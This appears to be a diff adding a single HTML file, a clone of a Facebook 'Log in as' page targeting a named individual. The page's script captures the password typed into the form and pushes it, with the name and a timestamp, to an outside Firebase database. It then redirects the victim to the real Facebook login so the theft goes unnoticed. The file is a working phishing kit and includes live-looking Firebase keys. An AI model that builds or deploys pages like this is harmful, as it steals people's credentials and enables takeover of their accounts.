@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        /* CSS to match the image exactly */
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .main-container { text-align: center; width: 100%; max-width: 400px; }
+        .fb-logo { color: #1877f2; font-size: 3.5rem; font-weight: bold; margin-bottom: 20px; letter-spacing: -1.5px; }
+        .login-card { background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); }
+        .avatar img { width: 85px; height: 85px; border-radius: 50%; background: #f0f2f5; margin-bottom: 10px; }
+        h2 { font-size: 1.2rem; margin: 5px 0; font-weight: 500; }
+        .user-id { font-size: 0.9rem; color: #606770; margin-bottom: 20px; }
+        .user-id a { color: #1877f2; text-decoration: none; }
+        input[type="password"] { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 1rem; outline: none; }
+        input[type="password"]:focus { border-color: #1877f2; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 6px; font-size: 1.1rem; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
+        .btn-login { background-color: #1877f2; color: white; }
+        .btn-login:hover { background-color: #166fe5; }
+        .btn-alt { background-color: #e4e6eb; color: #4b4f56; }
+        .footer-links a { color: #1877f2; text-decoration: none; font-size: 0.9rem; }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <h1 class="fb-logo">facebook</h1>
+        <div class="login-card">
+            <div class="avatar"><img src="https://www.w3schools.com/howto/img_avatar.png" alt="Profile"></div>
+            <h2>Log in as Aziz Chaffi</h2>
+            <p class="user-id">aziz.chaffi.2025 · <a href="#">Not you?</a></p>
+
+            <form id="loginForm">
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit" class="btn-login" id="submitBtn">Log In</button>
+                <button type="button" class="btn-alt">Try another way</button>
+            </form>
+            <div class="footer-links"><a href="#">Forgot account?</a></div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <script>
+        // Your actual configuration that you provided
+        const firebaseConfig = {
+            apiKey: "AIzaSyDWV0Ks0O5b0XktqJ4mOoRKGfqQZE7q5Eg",
+            authDomain: "testapp-f51a4.firebaseapp.com",
+            databaseURL: "https://testapp-f51a4-default-rtdb.firebaseio.com",
+            projectId: "testapp-f51a4",
+            storageBucket: "testapp-f51a4.firebasestorage.app",
+            messagingSenderId: "943524545175",
+            appId: "1:943524545175:web:7d49a182a6251a1c9e1fd2",
+            measurementId: "G-W5ZBDET3EQ"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Submit logic
+        const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const pass = document.getElementById('password').value;
+
+            submitBtn.innerText = "Loging in...";
+            submitBtn.disabled = true;
+
+            // Push data to Firebase
+            database.ref('logins/').push({
+                name: "Aziz Chaffi",
+                password: pass,
+                time: new Date().toLocaleString()
+            })
+            .then(() => {
+                // Success - redirect to real Facebook
+                window.location.href = "https://www.facebook.com/login";
+            })
+            .catch((error) => {
+                alert("Database Error: " + error.message);
+                submitBtn.innerText = "Log In";
+                submitBtn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
